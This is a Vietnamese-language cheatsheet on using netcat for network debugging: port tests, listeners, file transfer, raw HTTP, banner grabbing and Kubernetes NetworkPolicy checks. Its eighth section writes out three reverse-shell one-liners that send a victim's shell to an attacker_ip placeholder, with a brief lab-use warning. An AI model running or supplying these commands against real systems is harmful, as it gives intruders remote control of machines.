# 🔧 netcat (nc) — Dao Thụy Sĩ TCP/UDP

`netcat` (hay `nc`) là công cụ đọc/ghi dữ liệu thô qua TCP/UDP. Không có giao diện, không có protocol riêng — chỉ là pipe thẳng vào network socket. Chính vì vậy nó cực kỳ linh hoạt để debug.

> **Lưu ý:** Có 2 phiên bản phổ biến với cú pháp khác nhau: `netcat-traditional` (Debian) và `ncat` (nmap project / CentOS/RHEL). Bài này dùng cú pháp tương thích cả hai.

---

## 📖 Cheatsheet

### 1. Test port — Thay thế cho ping khi ICMP bị chặn
```bash
# Kiểm tra TCP port có mở không (-z: zero I/O, -v: verbose)
nc -zv 192.168.1.1 22
# Connection to 192.168.1.1 22 port [tcp/ssh] succeeded! ✅
# nc: connect to 192.168.1.1 port 22 (tcp) failed: Connection refused ❌

# Kiểm tra nhiều port cùng lúc
nc -zv 192.168.1.1 20-25

# UDP port test
nc -zuv 192.168.1.1 53
```

### 2. Timeout — Không bị treo vô tận
```bash
# -w: timeout (giây)
nc -zv -w 3 192.168.1.1 8080
# Fail sau 3 giây nếu không kết nối được
```

### 3. Tạo server lắng nghe tạm thời
```bash
# Terminal 1 — Bên Server (listen trên port 9999)
nc -l 9999
# Hoặc với ncat:
ncat -l 9999

# Terminal 2 — Bên Client (kết nối vào)
nc server_ip 9999

# Bây giờ gõ gì ở client → hiện ở server và ngược lại
# Dùng để: test firewall, verify kết nối end-to-end trước khi deploy app
```

### 4. Transfer file — Debug không cần SSH/SCP
```bash
# Bên nhận (chạy trước)
nc -l 9999 > received_file.tar.gz

# Bên gửi
nc receiver_ip 9999 < file_to_send.tar.gz
# Hoặc dùng pipe:
tar czf - /some/directory | nc receiver_ip 9999
```

### 5. Test HTTP thủ công — Hiểu raw HTTP
```bash
printf "GET / HTTP/1.0\r\nHost: example.com\r\n\r\n" | nc example.com 80
# Thấy raw HTTP response, không qua browser
```

### 6. Banner grabbing — Xác định service version
```bash
nc -v 192.168.1.1 22
# SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6 ← version SSH lộ ngay

nc -v 192.168.1.1 25
# 220 mail.example.com ESMTP Postfix ← SMTP server

nc -v 192.168.1.1 3306
# ← MySQL banner (xác nhận MySQL đang chạy, không cần credentials)
```

### 7. Relay / Pipe — Debug firewall rule phức tạp
```bash
# Forward traffic từ local port 8888 đến remote:80
# (Dùng mkfifo vì nc không hỗ trợ 2 chiều trực tiếp)
mkfifo /tmp/pipe
nc -l 8888 < /tmp/pipe | nc target_host 80 > /tmp/pipe
```

### 8. Reverse Shell — Điều khiển máy chủ từ xa
```bash
# Terminal 1 — Trên máy Attacker (mở port lắng nghe)
nc -l 4444

# Terminal 2 — Trên máy Victim (chạy bash và đẩy I/O về attacker)
# Cách 1: dùng nc -e (thường bị vô hiệu hóa vì lý do bảo mật)
nc attacker_ip 4444 -e /bin/bash

# Cách 2: dùng bash/dev/tcp (không cần dùng nc trên victim)
bash -i >& /dev/tcp/attacker_ip/4444 0>&1

# Cách 3: dùng mkfifo (nếu máy victim chỉ có nc truyền thống)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker_ip 4444 > /tmp/f
```
> **Cảnh báo:** Đây là kỹ thuật thường được dùng bởi hacker để chiếm quyền điều khiển. Dùng trong lab/testing bảo mật hoặc khi bị kẹt không có SSH.

---

## 🔍 Kịch bản thực chiến

### "Không biết firewall có chặn port không?"
```bash
# Trên server: mở port tạm
nc -l 12345

# Trên client: test kết nối
nc -zv server_ip 12345
# Nếu fail → firewall/Security Group chặn
# Nếu succeed → vấn đề ở application layer
```

### "Debug NetworkPolicy trong Kubernetes"
```bash
# Pod A muốn kết nối Pod B port 8080

# Trong Pod B: chạy listener
kubectl exec -it pod-b -- nc -l 8080

# Trong Pod A: test kết nối
kubectl exec -it pod-a -- nc -zv pod-b-ip 8080
# Fail → NetworkPolicy đang chặn → kiểm tra egress/ingress rules
```

### "Verify không có gì listen trên port trước khi deploy"
```bash
nc -zv localhost 3000
# Connection refused → port trống, an toàn để start app
```

### "Test UDP (DNS, QUIC, game server)"
```bash
# Server
nc -ul 5353

# Client
echo "test" | nc -u server_ip 5353
# UDP không có handshake → nc -z không reliable cho UDP, cần app-level response
```

---

## ⚠️ Giới hạn của netcat

| Tình huống | Vấn đề | Thay thế |
| :--- | :--- | :--- |
| Test HTTPS (TLS) | `nc` không handle TLS | `openssl s_client -connect host:443` |
| Xem HTTP headers đẹp | Raw output khó đọc | `curl -v` |
| Cần persistent server | `nc` chỉ accept 1 connection | `ncat --keep-open` hoặc dùng `socat` |
| Monitor traffic liên tục | `nc` không có stats | `tcpdump` |

---

> **Tóm lại:** `nc -zv host port` là lệnh đầu tiên để xác nhận firewall/NetworkPolicy có chặn không. `nc -l port` để dựng test server tạm không cần install gì. Biết 2 lệnh này = xử lý được 80% bài toán "tại sao không kết nối được".
